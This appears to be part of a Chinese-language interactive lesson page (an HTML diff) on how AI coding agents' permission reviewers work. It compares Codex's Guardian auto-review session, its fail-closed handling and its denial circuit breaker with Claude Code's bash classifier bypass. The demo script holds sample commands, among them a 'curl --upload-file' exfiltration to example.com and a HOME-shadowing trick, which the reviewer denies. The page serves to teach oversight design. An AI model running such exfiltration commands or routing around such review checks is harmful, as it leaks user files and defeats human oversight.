+      <h4><svg fill="currentColor" fill-rule="evenodd" height="16" style="flex:none;line-height:1" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M4.709 15.955l4.72-2.647.08-.23-.08-.128H9.2l-.79-.048-2.698-.073-2.339-.097-2.266-.122-.571-.121L0 11.784l.055-.352.48-.321.686.06 1.52.103 2.278.158 1.652.097 2.449.255h.389l.055-.157-.134-.098-.103-.097-2.358-1.596-2.552-1.688-1.336-.972-.724-.491-.364-.462-.158-1.008.656-.722.881.06.225.061.893.686 1.908 1.476 2.491 1.833.365.304.145-.103.019-.073-.164-.274-1.355-2.446-1.446-2.49-.644-1.032-.17-.619a2.97 2.97 0 01-.104-.729L6.283.134 6.696 0l.996.134.42.364.62 1.414 1.002 2.229 1.555 3.03.456.898.243.832.091.255h.158V9.01l.128-1.706.237-2.095.23-2.695.08-.76.376-.91.747-.492.584.28.48.685-.067.444-.286 1.851-.559 2.903-.364 1.942h.212l.243-.242.985-1.306 1.652-2.064.73-.82.85-.904.547-.431h1.033l.76 1.129-.34 1.166-1.064 1.347-.881 1.142-1.264 1.7-.79 1.36.073.11.188-.02 2.856-.606 1.543-.28 1.841-.315.833.388.091.395-.328.807-1.969.486-2.309.462-3.439.813-.042.03.049.061 1.549.146.662.036h1.622l3.02.225.79.522.474.638-.079.485-1.215.62-1.64-.389-3.829-.91-1.312-.329h-.182v.11l1.093 1.068 2.006 1.81 2.509 2.33.127.578-.322.455-.34-.049-2.205-1.657-.851-.747-1.926-1.62h-.128v.17l.444.649 2.345 3.521.122 1.08-.17.353-.608.213-.668-.122-1.374-1.925-1.415-2.167-1.143-1.943-.14.08-.674 7.254-.316.37-.729.28-.607-.461-.322-.747.322-1.476.389-1.924.315-1.53.286-1.9.17-.632-.012-.042-.14.018-1.434 1.967-2.18 2.945-1.726 1.845-.414.164-.717-.37.067-.662.401-.589 2.388-3.036 1.44-1.882.93-1.086-.006-.158h-.055L4.132 18.56l-1.13.146-.487-.456.061-.746.231-.243 1.908-1.312-.006.006z"></path></svg>Claude Code：分类器给弹窗抢时间</h4>
+      <p>在 Claude Code 的还原源码里同样没有 Guardian 那种独立审查会话、风险分类学 JSON 合同，或按 turn 计数的熔断器。找到的是 Bash 工具上的一条分类器旁路。分类器在用户弹窗已经显示时后台跑。高置信且用户还没动手，才替用户点允许。它匹配的是 prompt rule，范围是 bash 命令。弹窗仍在。失败时用户继续自己点。</p>
+      <p>差别可以收成一句话。Claude Code 用分类器给弹窗抢时间，Codex 用一次锁死会话把弹窗从主路径拿掉。前者省的是等待，后者改的是谁来做决定。</p>
+      <span class="cmp-tag">已核对 bashPermissions.ts 分类器旁路 · 2026-08-22</span>
+    </div>
+  </div>
+
+  <div class="sec-label paywall-locked">课堂练习</div>
+  <div class="exercise reveal paywall-locked">
+    <div class="exercise-num">01</div>
+    <div>
+      <h3>同一次 turn，熔断器怎么记账</h3>
+      <p>同一 turn 里，审查员先超时一次，再明确拒绝两次。问：下一次再明确拒绝时，Standard 熔断器会不会打断这一轮。把第二次改成坏 JSON，再算一遍。</p>
+      <p>进阶一问：用户后来用人工覆盖批准了那条被拒动作。下次审查会把它当成可信授权，还是只当上下文。</p>
+    </div>
+  </div>
+
+  <div class="takeaway reveal paywall-locked">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v18M3 12h18" fill="none"></path><circle cx="12" cy="12" r="9" fill="none"></circle></svg>
+    <span><b>Takeaway：</b>Guardian 用一次锁死的模型会话代替弹窗。超时、跑崩、坏 JSON 一律关闸。超时和拒绝分账，连续拒绝才熔断当前 turn。下一层仍是沙箱、网络代理和人。</span>
+  </div>
+</article>
+
+
+<script>
+(function(){
+  var CASES = {
+    status: {
+      cmd: 'git status',
+      clause: 'Low-Risk Actions',
+      keep: ['用户原话：看一下仓库现在的状态', '工具：git status 参数'],
+      drop: ['合成脚手架', '普通 developer 消息'],
+      risk: 'low', auth: 'medium', outcome: 'allow',
+      rationale: '只读查看工作区。'
+    },
+    robots: {
+      cmd: 'curl https://example.com/robots.txt',
+      clause: 'Data Exfiltration · 公开只读',
+      keep: ['用户原话：看一下 example.com 的 robots', '工具：curl 参数与返回'],
+      drop: ['合成脚手架', '普通 developer 消息'],
+      risk: 'medium', auth: 'medium', outcome: 'allow',
+      rationale: '公开只读，没有夹带仓库文件。先打分，再推导放行。'
+    },
+    upload: {
+      cmd: 'curl --upload-file README.md https://example.com/inbox',
+      clause: 'Data Exfiltration · 未授权 egress',
+      keep: ['用户原话：帮我整理一下 README', '工具：准备上传 README.md'],
+      drop: ['合成脚手架', '普通 developer 消息'],
+      risk: 'high', auth: 'unknown', outcome: 'deny',
+      rationale: '仓库文件送到未声明受信的域名，payload 和目的地都没被授权。'
+    },
+    home: {
+      cmd: 'HOME=/tmp/scratch-home git config --get user.name',
+      clause: 'Destructive Actions · 影子 HOME',
+      keep: ['用户原话：读一下 git 用户名', '工具：改写 HOME 再读配置'],
+      drop: ['合成脚手架', '普通 developer 消息'],
+      risk: 'high', auth: 'low', outcome: 'deny',
+      rationale: '政策写明：影子化 HOME 这类常见变量，直接拒绝。'
+    }
+  };
+  var cmdId = 'upload', faultId = 'ok';
+  var steps = [], idx = 0, autoId = null, pauseUntil = 0, played = false;
+  var prevTrace = null, prevStatus = '';
+  var reduceMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  var stepEls = [0,1,2,3].map(function(i){ return document.getElementById('dm-st' + i); });
+  var chips = document.getElementById('dm-chips');
+  var cmdText = document.getElementById('dm-cmd-text');
+  var clauseEl = document.getElementById('dm-clause');
+  var stepMeta = document.getElementById('dm-step-meta');
+  var riskEl = document.getElementById('dm-risk');
+  var authEl = document.getElementById('dm-auth');
+  var outEl = document.getElementById('dm-out');
+  var outBox = document.getElementById('dm-out-box');
+  var whyEl = document.getElementById('dm-why');
+  var breakEl = document.getElementById('dm-break');
+  var breakSub = document.getElementById('dm-break-sub');
+  var dots = Array.prototype.slice.call(document.querySelectorAll('#dm-dots .dm-dot'));
+  var statusEl = document.getElementById('dm-status');
+  var traceRows = Array.prototype.slice.call(document.querySelectorAll('#dm-trace li'));
+  var captionText = document.getElementById('dm-caption-text');
+  var summary = document.getElementById('dm-summary');
+  var stepsBox = document.querySelector('#demo-guardian .dm-steps');
+  var fieldsBox = document.querySelector('#demo-guardian .dm-fields');
+  var stepHead = document.querySelector('#demo-guardian .dm-col:first-child .dm-head');
+  var traceBox = document.querySelector('#demo-guardian .dm-trace');
+  var IDLE = '点播放，看一条命令怎么走过四步审查，以及熔断器什么时候接手。';
+
+  function buildSteps(){
+    var c = CASES[cmdId];
+    var out = [];
+    function base(extra){
+      return Object.assign({
+        onStep: -1, doneSteps: [], failStep: -1,
+        keep: [], drop: [],
+        risk: '—', auth: '—', outcome: '—', why: '等待评估', outKind: '',
+        clause: c.clause, cmd: c.cmd,
+        consec: 0, recent: 0, breakKind: '',
+        statusKind: '', status: '用户侧与模型侧还没有收到结论。',
+        meta: '审查进行中'
+      }, extra);
+    }
+    if (faultId === 'trip') {
+      var trip = CASES.upload;
+      out.push(base({
+        cap: '同一 turn 里，这条未授权上传已经在送审。Standard 熔断器从 0 开始记账。',
+        trace: 0, onStep: 0, cmd: trip.cmd, clause: trip.clause,
+        keep: trip.keep, drop: trip.drop, meta: '第 1 次送审'
+      }));
+      out.push(base({
+        cap: '第一次明确拒绝。熔断器记 1 次，连续计数还没到 3，turn 继续。',
+        trace: 9, onStep: 3, doneSteps: [0,1,2], cmd: trip.cmd, clause: trip.clause,
+        risk: trip.risk, auth: trip.auth, outcome: 'deny', why: trip.rationale, outKind: 'out-deny',
+        consec: 1, recent: 1, statusKind: 'warn',
+        status: '用户侧：Request denied。模型侧：禁止改道绕过。',
+        meta: '连续拒绝 1 / 3'
+      }));
+      out.push(base({
+        cap: '主模型又把同一类动作送上来。第二次明确拒绝，熔断器走到 2 / 3。',
+        trace: 9, onStep: 3, doneSteps: [0,1,2], cmd: trip.cmd, clause: trip.clause,
+        risk: trip.risk, auth: trip.auth, outcome: 'deny', why: trip.rationale, outKind: 'out-deny',
+        consec: 2, recent: 2, statusKind: 'warn',
+        status: '用户侧：Request denied。模型侧再次收到禁止改道的指示。',
+        meta: '连续拒绝 2 / 3'
+      }));
+      out.push(base({
+        cap: '第三次明确拒绝。连续 3 次碰到阈值，熔断器接手。',
+        trace: 10, onStep: 3, doneSteps: [0,1,2], failStep: 3, cmd: trip.cmd, clause: trip.clause,
+        risk: trip.risk, auth: trip.auth, outcome: 'deny', why: trip.rationale, outKind: 'out-deny',
+        consec: 3, recent: 3, breakKind: 'warn', trip: true, statusKind: 'warn',
+        status: 'GuardianWarning：3 consecutive, 3 in the last 50。接着 abort_turn_if_active。',
+        meta: 'InterruptTurn', fin: true
+      }));
+      return out;
+    }
+
+    out.push(base({
+      cap: '审批策略是 OnRequest，审查员配成 AutoReview。这条命令交给 Guardian，不弹给用户。',
+      trace: 0, onStep: -1, meta: '路由命中'
+    }));
+    out.push(base({
+      cap: '先抽出用户原话和最近几次工具痕迹。合成脚手架和普通 developer 消息丢掉。',
+      trace: 2, onStep: 0, keep: c.keep, drop: c.drop, meta: '第 1 步'
+    }));
+    out.push(base({
+      cap: '材料按 Full 或 Delta 拼好。history_version 对得上才复用 cursor，对不上就退回全文。',
+      trace: 3, onStep: 0, doneSteps: [], keep: c.keep, drop: c.drop, meta: '第 1 步'
+    }));
+    out.push(base({
+      cap: '审查员进一间上锁的只读房间：Never、MCP 清空、不继承 exec-policy。trunk 忙就另开一间小屋。',
+      trace: 4, onStep: 1, doneSteps: [0], keep: c.keep, drop: c.drop, meta: '第 2 步'
+    }));
+
+    if (faultId === 'timeout') {
+      out.push(base({
+        cap: '房间灯一直亮着。90 秒到点，还没有合法 JSON。超时这一项不重试。',
+        trace: 6, onStep: 1, doneSteps: [0], failStep: 1, keep: c.keep, drop: c.drop,
+        meta: '90 秒上限'
+      }));
+      out.push(base({
+        cap: '走 TimedOut。用户看到 Review timed out。模型收到：不要仅因超时认定不安全。熔断器连续计数清零。',
+        trace: 9, onStep: 3, doneSteps: [0], failStep: 1,
+        risk: '—', auth: '—', outcome: 'timed_out', why: '没有评估卡片', outKind: 'out-fail',
+        keep: c.keep, drop: c.drop, consec: 0, recent: 0, breakKind: '',
+        statusKind: 'hold',
+        status: '用户侧：Review timed out。模型侧：可以再试一次，或去问用户。',
+        meta: '失败关闸', fin: true
+      }));
+      return out;
+    }
+
+    if (faultId === 'badjson') {
+      out.push(base({
+        cap: '房间吐出一段没有花括号的散文。解析器只做一件薄容错：从第一个 { 切到最后一个 }。这里什么都切不到。',
+        trace: 7, onStep: 2, doneSteps: [0,1], keep: c.keep, drop: c.drop,
+        why: 'not-json 散文', outKind: 'out-fail', outcome: 'malformed', meta: '第 3 步'
+      }));
+      out.push(base({
+        cap: '解析失败。会重试的是瞬时会话错误和解析错误，最多 3 次。超时、取消、prompt 拼装失败不重试。',
+        trace: 7, onStep: 2, doneSteps: [0,1], keep: c.keep, drop: c.drop,
+        why: '第 2 次仍是散文', outKind: 'out-fail', outcome: 'malformed', meta: '重试中'
+      }));
+      out.push(base({
+        cap: '仍没有合法 JSON，走 FailedClosed。动作停住。熔断器走 record_non_denial，连续计数清零。',
+        trace: 9, onStep: 3, doneSteps: [0,1], failStep: 2,
+        risk: '—', auth: '—', outcome: 'failed_closed', why: '格式失败，没有评估', outKind: 'out-fail',
+        keep: c.keep, drop: c.drop, consec: 0, recent: 0,
+        statusKind: 'warn',
+        status: '用户侧：Automatic approval review failed。模型侧收到拒绝，熔断器不记连续拒绝。',
+        meta: '失败关闸', fin: true
+      }));
+      return out;
+    }
+
+    out.push(base({
+      cap: '审查员先打 risk_level 和 user_authorization，再推导 outcome。引用的条款是 ' + c.clause + '。',
+      trace: 7, onStep: 2, doneSteps: [0,1], keep: c.keep, drop: c.drop,
+      risk: c.risk, auth: c.auth, outcome: c.outcome, why: c.rationale,
+      outKind: c.outcome === 'allow' ? 'out-allow' : 'out-deny',
+      meta: '第 3 步'
+    }));
+    if (c.outcome === 'allow') {
+      out.push(base({
+        cap: '放行，主会话继续干活。熔断器走 record_non_denial，连续计数清零。',
+        trace: 8, onStep: 3, doneSteps: [0,1,2], keep: c.keep, drop: c.drop,
+        risk: c.risk, auth: c.auth, outcome: 'allow', why: c.rationale, outKind: 'out-allow',
+        consec: 0, recent: 0, breakKind: 'ok',
+        statusKind: 'ok', status: '用户侧：Approved。模型侧继续这条动作。',
+        meta: '应用结果', fin: true
+      }));
+    } else {
+      out.push(base({
+        cap: '拒绝，并告诉模型不许换条路再做一遍。熔断器记 1 次明确拒绝，还没到阈值。',
+        trace: 9, onStep: 3, doneSteps: [0,1,2], keep: c.keep, drop: c.drop,
+        risk: c.risk, auth: c.auth, outcome: 'deny', why: c.rationale, outKind: 'out-deny',
+        consec: 1, recent: 1,
+        statusKind: 'warn', status: '用户侧：Request denied。模型侧：禁止改道绕过，只允许实质更安全的替代。',
+        meta: '应用结果', fin: true
+      }));
+    }
+    return out;
+  }
+
+  function bump(el, cls){
+    if (!el) return;
+    el.classList.remove(cls);
+    void el.offsetWidth;
+    el.classList.add(cls);
+  }
+
+  function fadeText(el, text){
+    if (reduceMotion) { el.textContent = text; el.style.opacity = '1'; return; }
+    el.style.opacity = '0';
+    requestAnimationFrame(function(){
+      el.textContent = text;
+      requestAnimationFrame(function(){ el.style.opacity = '1'; });
+    });
+  }
+
+  function setVal(el, val, animate){
+    var prev = el.getAttribute('data-cur');
+    if (prev === null) prev = el.textContent;
+    if (prev === val) {
+      el.style.opacity = '1';
+      return false;
+    }
+    el.setAttribute('data-cur', val);
+    if (animate && !reduceMotion) {
+      el.style.opacity = '0';
+      requestAnimationFrame(function(){
+        el.textContent = val;
+        requestAnimationFrame(function(){ el.style.opacity = '1'; });
+      });
+    } else {
+      el.textContent = val;
+      el.style.opacity = '1';
+    }
+    return true;
+  }
+
+  function rollText(el, text, animate){
+    var prev = el.getAttribute('data-text') || el.textContent;
+    el.setAttribute('data-text', text);
+    if (!animate || reduceMotion) { el.textContent = text; return; }
+    var re = /\d+/g;
+    var pNums = prev.match(re);
+    var tNums = text.match(re);
+    var same = pNums && tNums && pNums.length === tNums.length && prev.replace(re, '#') === text.replace(re, '#');
+    if (!same) { el.textContent = text; return; }
+    var from = pNums.map(Number);
+    var to = tNums.map(Number);
+    var changed = from.some(function(n, i){ return n !== to[i]; });
+    if (!changed) { el.textContent = text; return; }
+    var start = null;
+    var dur = 560;
+    function frame(ts){
+      if (start === null) start = ts;
+      var t = Math.min(1, (ts - start) / dur);
+      var eased = 1 - (1 - t) * (1 - t) * (1 - t);
+      var i = 0;
+      el.textContent = text.replace(re, function(){
+        var n = Math.round(from[i] + (to[i] - from[i]) * eased);
+        i++;
+        return String(n);
+      });
+      if (t < 1) requestAnimationFrame(frame);
+    }
+    requestAnimationFrame(frame);
+  }
+
+  function enterChip(el){
+    el.classList.add('is-enter');
+    requestAnimationFrame(function(){
+      requestAnimationFrame(function(){ el.classList.add('in'); });
+    });
+  }
+
+  function paintChips(st, animate){
+    var oldRects = {};
+    Array.prototype.slice.call(chips.children).forEach(function(el){
+      oldRects[el.textContent] = el.getBoundingClientRect();
+    });
+    var want = [];
+    (st.keep || []).forEach(function(t){ want.push({t: t, k: 'keep'}); });
+    (st.drop || []).forEach(function(t){ want.push({t: t, k: 'drop'}); });
+    var existing = {};
+    Array.prototype.slice.call(chips.children).forEach(function(el){
+      existing[el.textContent] = el;
+    });
+    Array.prototype.slice.call(chips.children).forEach(function(el){
+      var still = want.some(function(w){ return w.t === el.textContent; });
+      if (!still) el.remove();
+    });
+    want.forEach(function(w){
+      var el = existing[w.t];
+      var isNew = !el;
+      if (!el) {
+        el = document.createElement('span');
+        el.textContent = w.t;
+        chips.appendChild(el);
+      }
+      el.className = 'dm-chip ' + w.k;
+      if (animate && isNew && !reduceMotion) enterChip(el);
+    });
+    if (animate && !reduceMotion) {
+      Array.prototype.slice.call(chips.children).forEach(function(el){
+        var old = oldRects[el.textContent];
+        if (!old) return;
+        var now = el.getBoundingClientRect();
+        var dx = old.left - now.left;
+        var dy = old.top - now.top;
+        if (!dx && !dy) return;
+        el.style.transition = 'none';
+        el.style.transform = 'translate(' + dx + 'px,' + dy + 'px)';
+        requestAnimationFrame(function(){
+          el.style.transition = '';
+          el.style.transform = '';
+        });
+      });
+    }
+  }
+
+  function paint(st, animate){
+    if (stepsBox) stepsBox.classList.add('is-live');
+    if (fieldsBox) fieldsBox.classList.add('is-live');
+    stepEls.forEach(function(el, n){
+      var cls = 'dm-st';
+      if (st.failStep === n) cls += ' fail';
+      else if (st.onStep === n) cls += ' on';
+      else if (st.doneSteps && st.doneSteps.indexOf(n) >= 0) cls += ' done';
+      var failedNow = st.failStep === n && !el.classList.contains('fail');
+      el.className = cls;
+      if (animate && failedNow) bump(el, 'firing');
+    });
+    if (stepHead) {
+      var filled = 0;
+      if (st.onStep >= 0) filled = st.onStep + 1;
+      if (st.doneSteps && st.doneSteps.length > filled) filled = st.doneSteps.length;
+      if (st.fin) filled = 4;
+      stepHead.style.setProperty('--bar', String(filled / 4));
+    }
+    if (animate && cmdText.textContent !== st.cmd) fadeText(cmdText, st.cmd);
+    else { cmdText.textContent = st.cmd; cmdText.style.opacity = '1'; }
+    var clause = st.clause || '条款未引用';
+    if (animate && clauseEl.textContent !== clause) fadeText(clauseEl, clause);
+    else { clauseEl.textContent = clause; clauseEl.style.opacity = '1'; }
+    var meta = st.meta || '';
+    if (animate && stepMeta.textContent !== meta) fadeText(stepMeta, meta);
+    else { stepMeta.textContent = meta; stepMeta.style.opacity = '1'; }
+
+    var riskCh = setVal(riskEl, st.risk, animate);
+    var authCh = setVal(authEl, st.auth, animate);
+    var outCh = setVal(outEl, st.outcome, animate);
+    var whyCh = setVal(whyEl, st.why, animate);
+    riskEl.parentNode.classList.toggle('now', riskCh);
+    authEl.parentNode.classList.toggle('now', authCh);
+    whyEl.parentNode.classList.toggle('now', whyCh);
+    outBox.className = 'dm-field' + (st.outKind ? ' ' + st.outKind : '') + (outCh ? ' now' : '');
+    if (animate && outCh) bump(outBox, 'pop');
+
+    paintChips(st, animate);
+
+    dots.forEach(function(el, n){
+      var on = n < st.consec;
+      var wasOn = el.classList.contains('on') || el.classList.contains('trip');
+      el.className = 'dm-dot' + (on ? (st.trip ? ' trip' : ' on') : '');
+      if (animate && on && !wasOn) bump(el, 'pop');
+    });
+    breakEl.className = 'dm-break' + (st.breakKind ? ' ' + st.breakKind : '');
+    breakEl.style.setProperty('--heat', String((st.consec || 0) / 3));
+    if (st.trip) bump(breakEl, 'firing');
+    var sub = st.trip
+      ? ('InterruptTurn · 连续 ' + st.consec + ' 次，窗口内 ' + st.recent + ' 次')
+      : ('连续拒绝 ' + st.consec + ' / 3，窗口 50 内累计 ' + st.recent);
+    rollText(breakSub, sub, animate);
+
+    statusEl.className = 'dm-status' + (st.statusKind ? ' ' + st.statusKind : '');
+    if (animate && st.status !== prevStatus) {
+      fadeText(statusEl, st.status);
+      if (st.statusKind === 'warn' || st.statusKind === 'ok' || st.trip) bump(statusEl, 'firing');
+    } else {
+      statusEl.textContent = st.status;
+      statusEl.style.opacity = '1';
+    }
+    prevStatus = st.status;
+
+    if (st.trace !== null && st.trace !== undefined) {
+      if (traceBox) traceBox.classList.add('is-live');
+      traceRows.forEach(function(el, n){
+        el.classList.toggle('on', n === st.trace);
+        if (animate && n === st.trace && st.trace !== prevTrace) bump(el, 'firing');
+      });
+      prevTrace = st.trace;
+    }
+    if (animate && captionText.textContent !== st.cap && !reduceMotion) {
+      captionText.style.opacity = '0';
+      requestAnimationFrame(function(){
+        captionText.textContent = st.cap;
+        requestAnimationFrame(function(){ captionText.style.opacity = '1'; });
+      });
+    } else {
+      captionText.textContent = st.cap;
+      captionText.style.opacity = '1';
+    }
+    if (st.fin) summary.classList.add('on');
+    else summary.classList.remove('on');
+  }
+
+  function holdFor(i){
+    var st = steps[i];
+    if (!st) return 1100;
+    if (st.fin) return 2400;
+    if (st.trip) return 2200;
+    if (st.outcome === 'timed_out' || st.outcome === 'failed_closed') return 2200;
+    if (st.risk !== '—' && st.onStep === 2) return 2000;
+    if (st.keep && st.keep.length && st.onStep === 0 && (!st.doneSteps || !st.doneSteps.length)) return 1800;
+    if (st.trace === 0) return 1100;
+    if (st.trace === 3) return 1200;
+    if (st.meta === '重试中') return 1400;
+    if (st.consec >= 1 && st.onStep === 3) return 1900;
+    return 1500;
+  }
+
+  function tick(){
+    if (idx >= steps.length) { stop(); return; }
+    paint(steps[idx], true);
+    idx++;
+    if (idx >= steps.length) stop();
+  }
+  function stop(){
+    if (autoId) { cancelAnimationFrame(autoId); autoId = null; }
+    pauseUntil = 0;
+  }
+  function loop(ts){
+    if (idx >= steps.length) { autoId = null; return; }
+    if (ts < pauseUntil) { autoId = requestAnimationFrame(loop); return; }
+    paint(steps[idx], true);
+    var wait = holdFor(idx);
+    idx++;
+    pauseUntil = ts + wait;
+    if (idx >= steps.length) { autoId = null; return; }
+    autoId = requestAnimationFrame(loop);
+  }
+  function resetView(){
+    var c = CASES[cmdId];
+    if (stepsBox) stepsBox.classList.remove('is-live');
+    if (fieldsBox) fieldsBox.classList.remove('is-live');
+    if (traceBox) traceBox.classList.remove('is-live');
+    if (stepHead) stepHead.style.setProperty('--bar', '0');
+    cmdText.textContent = c.cmd;
+    cmdText.style.opacity = '1';
+    clauseEl.textContent = '条款未引用';
+    clauseEl.style.opacity = '1';
+    stepMeta.textContent = '等待开始';
+    stepMeta.style.opacity = '1';
+    [riskEl, authEl, outEl, whyEl].forEach(function(el){
+      el.style.opacity = '1';
+      el.removeAttribute('data-cur');
+    });
+    riskEl.textContent = '—';
+    authEl.textContent = '—';
+    outEl.textContent = '—';
+    whyEl.textContent = '等待评估';
+    riskEl.parentNode.classList.remove('now');
+    authEl.parentNode.classList.remove('now');
+    whyEl.parentNode.classList.remove('now');
+    outBox.className = 'dm-field';
+    chips.innerHTML = '';
+    dots.forEach(function(el){ el.className = 'dm-dot'; });
+    breakEl.className = 'dm-break';
+    breakEl.style.setProperty('--heat', '0');
+    breakSub.textContent = '连续拒绝 0 / 3，窗口 50 内累计 0';
+    breakSub.setAttribute('data-text', breakSub.textContent);
+    statusEl.className = 'dm-status';
+    statusEl.textContent = '用户侧与模型侧还没有收到结论。';
+    statusEl.style.opacity = '1';
+    stepEls.forEach(function(el){ el.className = 'dm-st'; });
+    traceRows.forEach(function(el){ el.classList.remove('on'); el.classList.remove('firing'); });
+    summary.classList.remove('on');
+    captionText.style.opacity = '1';
+    captionText.textContent = IDLE;
+    prevTrace = null;
+    prevStatus = '';
+  }
+  function reset(){
+    stop(); idx = 0;
+    steps = buildSteps();
+    resetView();
+  }
+  function play(){
+    if (idx >= steps.length) reset();
+    if (autoId) return;
+    pauseUntil = 0;
+    autoId = requestAnimationFrame(loop);
+  }
+
+  document.getElementById('dm-play').addEventListener('click', play);
+  document.getElementById('dm-step').addEventListener('click', function(){ stop(); tick(); });
+  document.getElementById('dm-reset').addEventListener('click', reset);
+  document.getElementById('dm-cmd').addEventListener('click', function(e){
+    var b = e.target.closest('button');
+    if (!b) return;
+    Array.prototype.forEach.call(this.children, function(el){ el.classList.remove('on'); });
+    b.classList.add('on');
+    cmdId = b.getAttribute('data-cmd');
+    reset();
+  });
+  document.getElementById('dm-fault').addEventListener('click', function(e){
+    var b = e.target.closest('button');
+    if (!b) return;
+    Array.prototype.forEach.call(this.children, function(el){ el.classList.remove('on'); });
+    b.classList.add('on');
+    faultId = b.getAttribute('data-fault');
+    reset();
+  });
+
+  reset();
+  if (window.lessonOnView) {
+    window.lessonOnView(document.getElementById('demo-guardian'), function(){
+      if (played) return; played = true; play();
+    });
+  }
+})();
+</script>
+
+<!--seo:begin--><!--seo:end-->
+
+</body></html>
